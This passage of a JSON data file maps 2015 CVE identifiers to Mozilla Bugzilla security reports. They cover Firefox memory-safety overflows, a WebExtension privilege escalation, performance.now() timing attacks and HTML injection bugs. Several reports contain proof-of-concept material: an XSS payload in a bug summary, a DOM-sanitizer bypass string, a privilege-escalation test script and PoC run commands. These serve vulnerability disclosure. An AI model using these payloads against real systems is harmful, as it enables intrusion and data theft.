        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 Steps to reproduce: # Firefox HTTP2 Malformed PushPromise Underflow DoS ## Overview A malformed HTTP2 PushPromse frame is sent to the browser. The length of the decompressed buffer is miscalculated an underflow occurs. This causes an nsCString to try to allocate nearly 2^32 bytes of memory. This is greater than firefox allows and an assert is tripped. ## Walkthrough On line 1634 of Http2Session.cpp, a call is made to append the decompressed frame onto a decompressed buffer. self->mDecompressBuffer.Append(self->mInputFrameBuffer + kFrameHeaderBytes + paddingControlBytes + promiseLen, self->mInputFrameDataSize - paddingControlBytes - promiseLen - paddingLength); The values and types for the PoC are: self->mDecompressBuffer.Append(nsAutoArrayPtr<char>(ptr) + uint_8(9) + uint8_t(1) + uint32_t(4), uint32_t(76) - uint8_t(1) - uint32_t(4) - uint16_t(75)); The second argument is casted to a size_type (uint32), and the underflow occurs. The resulting value is 4294967292. A bunch of string checks are then performed to make sure the append is sane. Eventually in nsTSubstring.cpp:45 MutatePrep is called with: MutatePrep(this=0x00000xxxx, aCapacity=4294967292, aOldData=0x00000xxxxx, aOldFlags=0x00000xxxxxxx). In the function, kMaxCapacity for a string is determined to be: const size_type kMaxCapacity = (size_type(-1) / 2 - sizeof(nsStringBuffer)) / sizeof(char_type) - 2; // kMaxCapacity = 2147483637 kMaxCapacity is then compared to our capacity (4294967292). Since the capacity exceds the max allowed, an error is thrown on line 531 of nsTSubstring.cpp. AllocFailed(Length() - aCutLength + 1) ## Tested on Firefox 39.0. MacOS 42.0a1 (2015-07-21) MacOS ## PoC Code can be found here: https://notr-bucket.s3.amazonaws.com/977e424b-1c23-413b-b3f4-75d95cddd770 To use: Extract the file and the certs $ go run firefoxHeaderPoc.go $ ./firefox https://localhost:8000 ## Author Stuart Larsen Yahoo! Pentest Team"
      }
    ],
    "CVE-2015-7220": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1178033",
        "title": "Overflow in XDRBuffer::grow can cause memory-safety bug",
        "description": "XDRBuffer::grow (js/src/vm/Xdr.cpp, current trunk) can cause an overflow when computing the new buffer size. If this happens, grow allocates a buffer that is much too small, and its callers write far beyond its end: 27: bool 28: XDRBuffer::grow(size_t n) 29: { 30: MOZ_ASSERT(n > size_t(limit - cursor)); 31: 32: const size_t MIN_CAPACITY = 8192; 33: size_t offset = cursor - base; 34: size_t newCapacity = mozilla::RoundUpPow2(offset + n); 35: if (newCapacity < MIN_CAPACITY) 36: newCapacity = MIN_CAPACITY; 37: if (isUint32Overflow(newCapacity)) { 38: js::gc::AutoSuppressGC suppressGC(cx()); 39: JS_ReportErrorNumber(cx(), GetErrorMessage, nullptr, JSMSG_TOO_BIG_TO_ENCODE); 40: return false; 41: } 42: 43: void* data = js_realloc(base, newCapacity); 44: if (!data) { 45: ReportOutOfMemory(cx()); 46: return false; 47: } 48: base = static_cast<uint8_t*>(data); 49: cursor = base + offset; 50: limit = base + newCapacity; 51: return true; 52: } The problem occurs on 32-bit platforms only. If offset + n on line 34 exceeds 0x80000001, RoundUpPow2 returns 1 (1 << 32) under Windows 32-bit (note that this is actually undefined per C++11 s.5.8(1)). Lines 35-6 then calculate newCapacity==MIN_CAPACITY (8192). The test on line 37 is useless because newCapacity has already overflowed. Line 43 then allocates the tiny buffer, line 49 computes a cursor well outside the buffer's bounds, and the function returns true. Its caller then uses cursor to write into the buffer. XDRBuffer appears to be used to serialize compiled javascripts. Is it possible for a web page to contain one or more gigantic javascripts that would invoke this bug?"
      }
    ],
    "CVE-2015-7221": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1199400",
        "title": "Overflow in nsDeque::GrowCapacity can cause memory-safety bug",
        "description": "nsDeque::GrowCapacity (xpcom\\glue\\nsDeque.cpp) does not properly check for overflow. This can cause it to allocate a buffer that is too small to contain the deque's elements, some of which then are written to memory that the deque does not own. Details: -------- If the deque's existing capacity |mCapacity| has the range [0x10000000, 0x1fffffff] (1-2 GB), then line 166 (below) computes a valid |theNewSize| with the range [0x40000000, 0x7ffffffc] and the tests on lines 167-70 pass: 163: bool 164: nsDeque::GrowCapacity() 165: { 166: int32_t theNewSize = mCapacity << 2; 167: NS_ASSERTION(theNewSize > mCapacity, \"Overflow\"); 168: if (theNewSize <= mCapacity) { 169: return false; 170: } Control passes to line 171, which multiples |theNewSize| by |sizeof(void*)|, which is 4 on x86 architectures. The resulting values [0x100000000, 0x1fffffff0] overflow |size_t| on x86 architectures, and are truncated to [0, 0xfffffff0] [1]: 171: void** temp = (void**)malloc(theNewSize * sizeof(void*)); 172: if (!temp) { 173: return false; 174: } Line 171 can allocate sizes near the lower end of this range, so then control passes to lines 181-82, which write beyond the end of the buffer: 175: 176: //Here's the interesting part: You can't just move the elements 177: //directly (in situ) from the old buffer to the new one. 178: //Since capacity has changed, the old origin doesn't make 179: //sense anymore. It's better to resequence the elements now. 180: 181: memcpy(temp, mData + mOrigin, sizeof(void*) * (mCapacity - mOrigin)); 182: memcpy(temp + (mCapacity - mOrigin), mData, sizeof(void*) * mOrigin); ... Any elements added later are also written beyond the end of the buffer. [1] There is no overflow on x64 architectures, where |sizeof(size_t)| == 8."
      }
    ],
    "CVE-2015-7222": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1216748",
        "title": "stagefright: potential underflow in 'covr', unchecked allocation&copy in Metadata::setData",
        "description": "AndroidID-20923261, patched in May 2015, published in August 2015: https://android.googlesource.com/platform/frameworks/av/+/c87faed60483afb2466e03892bda80b72e5822c7%5E!/#F0 \"Fix integer underflow in covr MPEG4 processing When the 'chunk_data_size' variable is less than 'kSkipBytesOfDataBox', an integer underflow can occur. This causes an extraordinarily large value to be passed to MetaData::setData, leading to a buffer overflow.\" As well as fixing the underflow there, Metadata::setData and dependent methods could do with more checks before/after allocating memory and copying data. As the malloc in Metadata could be given an enormous value, and the return pointer is not checked, and data is blindly copied there, it should be considered a potential security risk (though probably just a crash risk, but let's keep it hidden for now)."
      }
    ],
    "CVE-2015-7223": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1226423",
        "title": "Privilege escalation vulnerabilities in WebExtension APIs",
        "description": "We don't currently check that a document belongs to our extension before injecting APIs into it. In the case of background pages, we also continue injecting APIs into new window globals even after the first load. This means that if a background page navigates to a remote web page, that page has the full privileges of the extension. The attached testcase has a background page which navigates to https://people.mozilla.org/~kmaglione/webext-privilege-escalation.html, which contains this code: dump(`WEBEXT-PRIVILEGE-ESCALATION.HTML\\n`); dump(`WEBEXT-PRIVILEGE-ESCALATION.HTML: window.browser: ${window.browser && Object.keys(window.browser).sort()}\\n`); browser.tabs.query({}, tabs => { dump(`WEBEXT-PRIVILEGE-ESCALATION.HTML: Tab urls: ${Array.from(tabs, t => t.url).join(\" \")}\\n`); }); And results in this console output: WEBEXT-PRIVILEGE-ESCALATION.HTML WEBEXT-PRIVILEGE-ESCALATION.HTML: window.browser: alarms,browserAction,extension,i18n,pageAction,runtime,tabs,test,windows WEBEXT-PRIVILEGE-ESCALATION.HTML: Tab urls: about:home about:addons"
      }
    ],
    "CVE-2015-7327": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1167489",
        "title": "\"Spy in the Sandbox\" - Security issue related to High Resolution Time API",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3 Steps to reproduce: My name is Yossi and I’m a post-doc at Columbia University’s Network Security Lab. We’ve recently published a report describing a new Javascript-based network attack. Our attack lets a malicious website learn a surprising amount of personal information about an innocent user, and is largely based upon repeated calls to performance.now() as a measurement method. Here is a proof of concept that works on Firefox 34 and later for Mac OS and Linux: http://s.codepen.io/yossioren/debug/ba94a14dd5942fda5db1a3e70809181d? From our testing it is very apparent that somewhat reducing the resolution of performance.now() will make the attack much more difficult. We noticed that various browser vendors implement the call with different precisions, with Firefox for Linux and MacOS going down to the single nanosecond. Our attack as described becomes very difficult to launch once the resolution of performance.now() is upper-bounded to 5 thousandths of a millisecond. Assuming there is not too much of a usability loss (to games, music, VR, etc) if this resolution is upper-bounded, perhaps you should look at changing your implementation. We’re also in touch with the relevant parties at the W3C to modify the standard accordingly. I would welcome answering any questions or concerns you may have. We can have a phone call / teleconf if it’s easier for you."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1153672",
        "title": "Fingerprinting individuals via performance.now()",
        "description": "Amit Klein is working on research that shows it's possible to extract the Windows counter frequency using the Windows.performance.now() high-resolution timer, and that this value is consistent between Firefox and IE. He doesn't mention Chrome which also supports this now-standard feature (http://www.w3.org/TR/hr-time) so it's unclear if the technique doesn't work on Chrome or if he simply didn't test it. Amit is able to detect two families of VM by their characteristic frequency, and between two machines of the same nominal clock speed there can be a detectable and consistent skew that raises fingerprinting worries. He has also reported this to Microsoft and we should coordinate any disclosures through Amit to make sure everyone's on the same page."
      }
    ],
    "CVE-2015-8508": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1221518",
        "title": "[SECURITY] XSS in dependency graphs when displaying the bug summary",
        "description": "During the generation of a dependency graph also the code for the html image map is generated if a local dot installation is used. With html escaped characters in a bug summary it is possible to inject custom lines in the *.map file with which the CreateImagemap function generates html code without filtering. poc: - configure bugzilla to use a local dot installation to generate a dependency graph - create a bug with the following summary: &#10;default \"><script>alert(1)</script> G - visit /showdependencygraph.cgi?id=<BUG-ID>&showsummary=on&display=tree&rankdir=TB, a javascript alert prompt will show up"
      }
    ],
    "CVE-2015-8509": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1232785",
        "title": "[SECURITY] Buglists in CSV format can be parsed as valid javascript in some browsers",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36 Steps to reproduce: Hey, I'll explain it in the next comment. Cheers,"
      }
    ],
    "CVE-2015-8510": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1190038",
        "title": "HTML injection on homescreen app (with bypassing DOM sanitizer)",
        "description": "1. Prepare a device that Firefox OS 2.5.0.0-prelease is installed. I used my Flame with a firmware id 201507311030207. 2. Launch Browser and open http://csrf.jp/manifest/xss.html . 3. Push 'Add to home screen' button and 'Add' button. Then a bookmark with a lock icon is created. 4. Long press the lock icon and try to uninstall the bookmark. 5. As attached picture, a confirmation dialog is shown with FM Radio application (if reproduced). At step 2, the page sets \"<s>PoC<iframe src=app://fm.gaiamobile.org/index.html mozbrowser></iframe>\" as it's application name throught the web manifest. When I set iframe tag simply like \"<iframe src=app://fm.gaiamobile.org/index.html mozbrowser></iframe>\" as an application name then the iframe is correctly removed by DOM sanitizer in Gaia. But above text pattern, i.e., <s> + <iframe>, can bypass DOM sanitizer and the iframe is executed with homescreen app's privilege."
      }
    ]
  }
}